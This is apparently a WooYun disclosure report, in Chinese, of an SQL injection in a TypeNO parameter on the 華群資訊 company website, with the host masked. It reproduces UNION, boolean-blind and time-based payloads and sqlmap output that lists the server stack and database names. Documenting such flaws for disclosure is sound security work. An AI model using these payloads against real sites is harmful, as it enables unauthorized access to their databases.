wybug_detail: 漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-16：	厂商已经确认，细节仅向厂商公开									2015-12-26：	细节向核心白帽子及相关领域专家公开									2016-01-05：	细节向普通白帽子公开									2016-01-15：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 華群資訊官网sql注射 详细说明：  華群資訊官网sql注射链接：http://**.**.**.**/TemplateMSG.php?TypeNO=4注入参数：Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: TypeNO=-9785 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171716271,0x44757a665149434a474c,0x716b6b7071),NULL,NULL,NULL--    漏洞证明：  Parameter: TypeNO (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: TypeNO=4 AND 4541=4541    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: TypeNO=4 AND (SELECT * FROM (SELECT(SLEEP(5)))cpVy)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: TypeNO=-9785 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171716271,0x44757a665149434a474c,0x716b6b7071),NULL,NULL,NULL-- ---[15:24:00] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: PHP 4.4.7, Apache 2.0.59back-end DBMS: MySQL 5.0.12[15:24:00] [INFO] fetching database names[15:24:00] [INFO] the SQL query used returns 5 entries[15:24:00] [INFO] retrieved: information_schema[15:24:01] [INFO] retrieved: mysql[15:24:01] [INFO] retrieved: phpmyadmin[15:24:01] [INFO] retrieved: sm_king[15:24:01] [INFO] retrieved: testavailable databases [5]:                                                                                                              [*] information_schema[*] mysql[*] phpmyadmin[*] sm_king[*] test   修复方案：  参数过滤！   版权声明：转载请注明来源 路人甲@乌云
